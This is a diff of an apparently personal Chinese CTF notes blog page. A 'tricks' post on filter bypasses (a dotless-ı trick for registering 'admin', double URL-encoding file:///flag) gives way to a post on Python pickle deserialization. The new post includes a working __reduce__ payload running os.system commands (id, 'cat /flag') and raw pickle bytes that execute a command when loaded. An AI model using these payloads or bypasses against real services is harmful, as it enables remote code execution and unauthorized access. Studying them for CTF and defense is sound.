@@ -19,21 +19,22 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="特殊字符‘ ı ‘, 不等于i，但是大写等于大写的I，这在注册时过滤admin后转大写时，可以起到注册admin的作用 123456789&#96;&#96;&#96;javascriptfor (var j &#x3D; &#x27;A&#x27;.charCodeAt(); j &lt;&#x3D; &#x27;Z&#x27;.charCodeAt(); j++)&#123;	var s &#x3D; String.fromCodePoint(j">
+    <meta name="description" content="文章 pickle.dumps，pickle.loads相当于python的序列化和反序列化。 123456789101112import pickleimport osclass tmp():        text &#x3D; &quot;123&quot;        def __reduce__(self):                return (os.system,(&quot;id&amp;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="tricks">
-<meta property="og:url" content="http://mekrina.github.io/blogs/tricks/tricks/index.html">
+<meta property="og:title" content="pickle反序列化">
+<meta property="og:url" content="http://mekrina.github.io/blogs/python/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="mekrina">
-<meta property="og:description" content="特殊字符‘ ı ‘, 不等于i，但是大写等于大写的I，这在注册时过滤admin后转大写时，可以起到注册admin的作用 123456789&#96;&#96;&#96;javascriptfor (var j &#x3D; &#x27;A&#x27;.charCodeAt(); j &lt;&#x3D; &#x27;Z&#x27;.charCodeAt(); j++)&#123;	var s &#x3D; String.fromCodePoint(j">
+<meta property="og:description" content="文章 pickle.dumps，pickle.loads相当于python的序列化和反序列化。 123456789101112import pickleimport osclass tmp():        text &#x3D; &quot;123&quot;        def __reduce__(self):                return (os.system,(&quot;id&amp;">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
-<meta property="article:modified_time" content="2025-03-11T01:41:57.362Z">
+<meta property="article:modified_time" content="2025-03-11T13:48:52.204Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pickle,python">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>tricks - mekrina</title>
+  <title>pickle反序列化 - mekrina</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="tricks"></span>
+            <span id="subtitle" data-typed-text="pickle反序列化"></span>
           
         </div>
 
@@ -222,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          309 字
+          151 字
         
       </span>
     
@@ -233,7 +234,7 @@
         
         
         
-          3 分钟
+          2 分钟
         
       </span>
     
@@ -270,17 +271,17 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">tricks</h1>
+            <h1 id="seo-header">pickle反序列化</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>‘ ı ‘, 不等于i，但是大写等于大写的I，这在注册时过滤admin后转大写时，可以起到注册admin的作用</p>
-<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">```<span class="language-javascript">javascript</span><br><span class="language-javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-string">&#x27;A&#x27;</span>.<span class="hljs-title function_">charCodeAt</span>(); j &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>.<span class="hljs-title function_">charCodeAt</span>(); j++)&#123;</span><br><span class="language-javascript">	<span class="hljs-keyword">var</span> s = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(j);</span><br><span class="language-javascript">	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10FFFF</span>; i++) &#123;</span><br><span class="language-javascript">		<span class="hljs-keyword">var</span> e = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(i);</span><br><span class="language-javascript">		<span class="hljs-keyword">if</span> (s == e.<span class="hljs-title function_">toUpperCase</span>() &amp;&amp; s != e) &#123;</span><br><span class="language-javascript">			<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;char: &quot;</span>+e+<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="language-javascript">	&#125;;</span><br><span class="language-javascript">&#125;;</span><br></code></pre></td></tr></table></figure>
-<h2 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h2><p>当先过滤再url解码时有用<br>	比如网页有curl功能，访问file:&#x2F;&#x2F;&#x2F;flag即可得到flag，但是flag被过滤了，这时可以利用url编码，file:&#x2F;&#x2F;&#x2F;%66%6c%61%67，进行绕过。curl的时候由于可以访问url编码后的网页<br>浏览器搜索框和burpsuite会自动对url进行解码一次，因此在这二者中需要多编码一次。变成<br>file:&#x2F;&#x2F;&#x2F;%2566%256c%2561%2567，即对%进行编码，其实编码第一个%即可，因为这样后端收到的就是 file:&#x2F;&#x2F;&#x2F;%66lag 了，自然可以绕过。</p>
-<p>2025&#x2F;3&#x2F;2 edit:</p>
-<p>burpsuite和浏览器不会对url进行解码,而是访问php页面,存储到get或者post数组时会解码一次.<br>而$_SERVER[‘QUERY_STRING’]不会进行解码</p>
-<p>python中requests会自动对请求进行url编码(encode)</p>
+                <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7032">文章</a></p>
+<p>pickle.dumps，pickle.loads相当于python的序列化和反序列化。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tmp</span>():<br>        text = <span class="hljs-string">&quot;123&quot;</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>                <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&quot;id&quot;</span>,)) <span class="hljs-comment"># return (os.system,(&quot;env;ls /;cat /flag&quot;,))</span><br>text = tmp()<br>serialized_text = pickle.dumps(text)<br><span class="hljs-built_in">print</span>(serialized_text)<br><br>reltext = pickle.loads(serialized_text)<br><span class="hljs-built_in">print</span>(reltext.text)<br></code></pre></td></tr></table></figure>
+<p><strong>这里的__reduce__函数相当于php中的__wakeup</strong>, 参数1是函数，参数2是要传递给该函数的参数。<br>pickle在反序列化的时候会自动import未import的模块，直接执行。 这里的opcode是上述例子serialized_text</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br>pickle.loads(<span class="hljs-string">b&#x27;\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p>会自动执行命令。</p>
 
                 
               </div>
@@ -299,7 +300,7 @@
     
       <span class="category-chain">
         
-  <a href="/blogs/categories/tricks/" class="category-chain-item">tricks</a>
+  <a href="/blogs/categories/python/" class="category-chain-item">python</a>
   
   
 
@@ -311,6 +312,13 @@
     </div>
   
   
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/blogs/tags/pickle-python/" class="print-no-link">#pickle,python</a>
+      
+    </div>
+  
 </div>
 
 
@@ -319,8 +327,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>tricks</div>
-      <div>http://mekrina.github.io/blogs/tricks/tricks/</div>
+      <div>pickle反序列化</div>
+      <div>http://mekrina.github.io/blogs/python/pickle反序列化/</div>
     </div>
     <div class="license-meta">
       
@@ -364,9 +372,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/ssrf/ssrf%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" title="ssrf">
+                      <a href="/blogs/php/php%E7%89%B9%E6%80%A7/" title="php特性">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ssrf</span>
+                        <span class="hidden-mobile">php特性</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -374,8 +382,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blogs/xss/xss/" title="xss">
-                        <span class="hidden-mobile">xss</span>
+                      <a href="/blogs/flask/python%20session%E4%BC%AA%E9%80%A0/" title="flask session伪造">
+                        <span class="hidden-mobile">flask session伪造</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
